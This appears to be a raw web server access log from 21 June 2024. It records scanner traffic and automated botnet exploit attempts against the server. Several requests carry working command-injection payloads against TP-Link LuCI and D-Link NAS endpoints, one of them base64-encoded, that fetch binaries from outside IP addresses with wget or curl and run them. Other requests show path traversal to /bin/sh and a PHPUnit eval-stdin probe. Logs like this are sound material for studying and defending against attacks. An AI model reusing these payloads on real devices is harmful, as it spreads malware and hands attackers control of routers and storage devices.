167.99.44.86 - - [21/Jun/2024:02:52:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
119.179.247.56 - - [21/Jun/2024:02:56:42 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 301 166 "-" "Hello, World"
119.179.247.56 - - [21/Jun/2024:02:56:42 +0000] ";sh+/tmp/gpon80&ipv=0" 400 154 "-" "-"
92.249.48.222 - - [21/Jun/2024:02:59:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
192.168.0.101 - - [21/Jun/2024:03:00:42 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:03:00:43 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
176.58.108.147 - - [21/Jun/2024:03:14:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
176.58.108.147 - - [21/Jun/2024:03:14:10 +0000] "\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03G\xC4\x10Ak\x9C\xEC!\xB56\xB7i\x7F\xC12\xDF \xBA~\xE7\xD4\x14\xA4)!\xAD\xDA\x10y\x7F\x18J Q\xED\xE9\x9D\x00%\xD0H\xC5I\x88\xB8\x8FqXZw\xAB\xDAuO\x9Eg" 400 154 "-" "-"
176.58.108.147 - - [21/Jun/2024:03:14:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
176.58.108.147 - - [21/Jun/2024:03:14:10 +0000] "\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03bJ\xA5\xA2p\x96dV\xA1\xB4\x02T\xC6\x8B\xEF\xE4w" 400 154 "-" "-"
176.58.108.147 - - [21/Jun/2024:03:14:10 +0000] "\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03{\xC6\xCD\xB3\xE4@6Q\x9DJ\x8C\xA4\x1D\x90\xEB\xD9\xB8\xF4\xC5\xEE\x01J\x95\xFB\xBF\xBAF\xF5\x8D\xB5\xC4\xF6 .\x1C\xD47O\xC8\x5CuI6\xDE\xEF~\xACXX\xB7,d\x00\xF8\xFD\xD1\x13\x857\xD5i\xF1\xC4/5\x00$\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\xC0$\xC0(\xC0#\xC0'\x00\x9F\x00\x9E\x00k\x00g\x00\xFF\x01\x00\x00\x8B\x00\x0B\x00\x04\x03\x00\x01\x02\x00" 400 154 "-" "-"
92.249.48.222 - - [21/Jun/2024:03:16:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.67 - - [21/Jun/2024:03:20:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.174 - - [21/Jun/2024:03:34:50 +0000] "GET /cgi-bin/nas_sharing.cgi?cmd=15&passwd=&system=ZWNobwktZQkiXHg2M1x4NjRceDIwXHgyZlx4NzRceDZkXHg3MFx4M2JceDIwXHg3Mlx4NmRceDIwXHgyZFx4NzJceDY2XHgyMFx4NzNceDY4XHg2Ylx4M2JceDIwXHg3N1x4NjdceDY1XHg3NFx4MjBceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmXHgzNFx4MzVceDJlXHgzMVx4MzRceDM4XHgyZVx4MzFceDMwXHgyZVx4MzdceDM4XHgyZlx4NzNceDY4XHg2Ylx4MjBceDdjXHg3Y1x4MjBceDYzXHg3NVx4NzJceDZjXHgyMFx4MmRceDRmXHgyMFx4NjhceDc0XHg3NFx4NzBceDNhXHgyZlx4MmZceDM0XHgzNVx4MmVceDMxXHgzNFx4MzhceDJlXHgzMVx4MzBceDJlXHgzN1x4MzhceDJmXHg3M1x4NjhceDZiXHgyMFx4N2NceDdjXHgyMFx4NzRceDY2XHg3NFx4NzBceDIwXHgyZFx4NjdceDIwXHgyZFx4NzJceDIwXHg3M1x4NjhceDZiXHgyMFx4MzRceDM1XHgyZVx4MzFceDM0XHgzOFx4MmVceDMxXHgzMFx4MmVceDM3XHgzOFx4M2JceDIwXHg2M1x4NjhceDZkXHg2Zlx4NjRceDIwXHgyYlx4NzhceDIwXHg3M1x4NjhceDZiXHgzYlx4MjBceDJlXHgyZlx4NzNceDY4XHg2Ylx4MjBceDY0XHg2Y1x4NjlceDZlXHg2Ylx4M2JceDIwXHg3Mlx4NmRceDIwXHgyZFx4NzJceDY2XHgyMFx4NzNceDY4XHg2Ylx4M2IifHNo&user=messagebus HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [21/Jun/2024:03:36:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
168.232.15.98 - - [21/Jun/2024:03:47:41 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
185.191.126.213 - - [21/Jun/2024:03:51:32 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
92.249.48.222 - - [21/Jun/2024:03:52:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
199.45.155.104 - - [21/Jun/2024:03:54:01 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
199.45.155.104 - - [21/Jun/2024:03:54:12 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
185.191.127.212 - - [21/Jun/2024:04:01:29 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
64.62.197.20 - - [21/Jun/2024:04:10:49 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:62.0) Gecko/20100101 Firefox/62.0"
64.62.197.24 - - [21/Jun/2024:04:12:17 +0000] "GET /webui/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
64.62.197.22 - - [21/Jun/2024:04:12:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
64.62.197.20 - - [21/Jun/2024:04:13:10 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
64.62.197.26 - - [21/Jun/2024:04:13:45 +0000] "GET /geoserver/web/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:62.0) Gecko/20100101 Firefox/62.0"
92.249.48.222 - - [21/Jun/2024:04:17:03 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.43 - - [21/Jun/2024:04:20:08 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.249.48.222 - - [21/Jun/2024:04:33:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
87.236.176.121 - - [21/Jun/2024:04:33:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
152.42.245.98 - - [21/Jun/2024:04:35:53 +0000] "CONNECT cloudflare.com:443 HTTP/1.1" 400 154 "-" "-"
162.216.150.55 - - [21/Jun/2024:04:35:59 +0000] "GET / HTTP/1.1" 301 166 "http://180.233.121.154:1081/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.249.48.222 - - [21/Jun/2024:04:58:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.74 - - [21/Jun/2024:05:10:59 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0"
92.249.48.222 - - [21/Jun/2024:05:16:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
57.152.56.140 - - [21/Jun/2024:05:19:57 +0000] "GET /portal/redlion HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
179.43.161.135 - - [21/Jun/2024:05:24:00 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
66.240.205.34 - - [21/Jun/2024:05:24:20 +0000] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 154 "-" "-"
92.249.48.222 - - [21/Jun/2024:05:38:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [21/Jun/2024:05:53:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
49.44.82.138 - - [21/Jun/2024:05:55:03 +0000] "GET / HTTP/1.1" 301 166 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
141.98.11.79 - - [21/Jun/2024:05:58:20 +0000] "CONNECT google.com:443 HTTP/1.1" 400 154 "-" "-"
185.191.127.212 - - [21/Jun/2024:05:58:47 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
141.98.11.67 - - [21/Jun/2024:06:01:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.191.127.212 - - [21/Jun/2024:06:09:38 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [21/Jun/2024:06:12:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [21/Jun/2024:06:12:13 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
109.205.213.198 - - [21/Jun/2024:06:21:25 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
92.249.48.222 - - [21/Jun/2024:06:33:44 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
118.179.167.133 - - [21/Jun/2024:06:38:40 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
118.179.167.133 - - [21/Jun/2024:06:38:40 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 154 "-" "-"
118.179.167.133 - - [21/Jun/2024:06:38:40 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 166 "-" "Custom-AsyncHttpClient"
192.12.240.40 - - [21/Jun/2024:06:44:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
92.249.48.222 - - [21/Jun/2024:06:56:44 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [21/Jun/2024:07:13:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.174.191.31 - - [21/Jun/2024:07:21:43 +0000] "GET / HTTP/1.0" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
92.249.48.237 - - [21/Jun/2024:07:29:03 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
92.249.48.222 - - [21/Jun/2024:07:32:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.237 - - [21/Jun/2024:07:34:21 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
92.249.48.237 - - [21/Jun/2024:07:45:17 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
45.148.10.174 - - [21/Jun/2024:07:47:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
45.148.10.174 - - [21/Jun/2024:07:47:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.237 - - [21/Jun/2024:07:48:24 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
216.218.206.68 - - [21/Jun/2024:07:50:04 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC8i\xDD\x13Y\xEC\xA5\x82\xD0\x84\x93l\x98\xF5\x85Rg\x9C\xA5\x83\xA3n63mC9\xF9C\xC8\xA7\xAF\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
92.249.48.222 - - [21/Jun/2024:07:53:39 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.156.129.46 - - [21/Jun/2024:07:54:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
65.154.226.170 - - [21/Jun/2024:08:01:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
185.191.127.212 - - [21/Jun/2024:08:11:24 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [21/Jun/2024:08:14:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
159.65.187.74 - - [21/Jun/2024:08:17:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
92.249.48.237 - - [21/Jun/2024:08:32:32 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
92.249.48.222 - - [21/Jun/2024:08:33:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.67 - - [21/Jun/2024:08:36:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.47 - - [21/Jun/2024:08:36:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.249.48.222 - - [21/Jun/2024:09:00:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [21/Jun/2024:09:13:26 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [21/Jun/2024:09:18:36 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.43 - - [21/Jun/2024:09:20:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.224.128.74 - - [21/Jun/2024:09:33:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [21/Jun/2024:09:34:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.74 - - [21/Jun/2024:09:41:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.152.52.23 - - [21/Jun/2024:09:41:45 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
185.224.128.74 - - [21/Jun/2024:09:42:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [21/Jun/2024:09:54:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
